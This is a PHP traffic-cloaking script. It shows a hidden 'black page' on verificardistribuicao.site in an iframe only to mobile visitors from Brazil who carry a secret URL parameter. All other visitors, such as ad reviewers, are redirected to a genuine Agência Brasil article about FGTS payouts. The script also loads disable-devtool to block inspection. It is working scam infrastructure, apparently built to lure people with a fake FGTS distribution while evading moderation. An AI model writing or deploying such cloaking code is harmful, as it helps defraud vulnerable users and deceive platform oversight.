<?php
// Carrega variáveis de ambiente
if (file_exists('.env')) {
    $env = parse_ini_file('.env');
    foreach ($env as $key => $value) {
        putenv("$key=$value");
    }
}

// Configurações das páginas
$whitePage = getenv('WHITE_PAGE') ?: "https://agenciabrasil.ebc.com.br/radioagencia-nacional/economia/audio/2024-08/trabalhadores-vao-receber-parte-do-lucro-de-r-152-bilhoes-do-fgts#:~:text=O%20FGTS%20vai%20distribuir%20aos,FGTS%20lucrou%20do%20ano%20passado";
$blackPage = getenv('BLACK_PAGE') ?: "https://verificardistribuicao.site/rosinha-oficial-berlim/";

$NomeParametroSeguro = getenv('SECURITY_PARAM_NAME') ?: "JS1CLdcHVbKA";
$ValorParametroSeguro = getenv('SECURITY_PARAM_VALUE') ?: "LBowyKAwmgeO";

// Função para verificar dispositivo móvel
function isMobileDevice() {
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    return preg_match('/iphone|ipod|ipad|android|blackberry|windows phone/', $userAgent);
}

// Recuperar país do IP
function getCountryFromIP($ip) {
    $apiUrl = "http://ip-api.com/json/{$ip}";
    $response = @file_get_contents($apiUrl);
    $data = json_decode($response, true);
    return $data['countryCode'] ?? null;
}

// Verificar se o parâmetro de segurança está presente
function checkParam($name, $value) {
    if (isset($_GET[$name]) && $_GET[$name] == $value) {
        return true;
    }
    return false;
}

// Variáveis do usuário
$ip = $_SERVER['REMOTE_ADDR'];
$country = getCountryFromIP($ip);
$isMobile = isMobileDevice();
$paramValid = checkParam($NomeParametroSeguro, $ValorParametroSeguro);

// Determinar qual página exibir
$showBlackPage = $isMobile && $country === 'BR' && $paramValid;

// Se a condição para a BlackPage não for satisfeita, redireciona para a WhitePage
if (!$showBlackPage) {
    header("Location: " . $whitePage . "?" . $_SERVER['QUERY_STRING']);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Página Oficial</title>
    <style>
        * {
            margin: 0;
            padding: 0;
        }
        iframe {
            border: none;
            width: 100%;
            height: 100vh;
        }
    </style>
</head>
<body>
    <!-- Exibe a BlackPage via iframe -->
    <iframe src="<?= $blackPage . '?' . $_SERVER['QUERY_STRING'] ?>"></iframe>
<script disable-devtool-auto src="https://cdn.jsdelivr.net/npm/disable-devtool"></script>
</body>
</html>
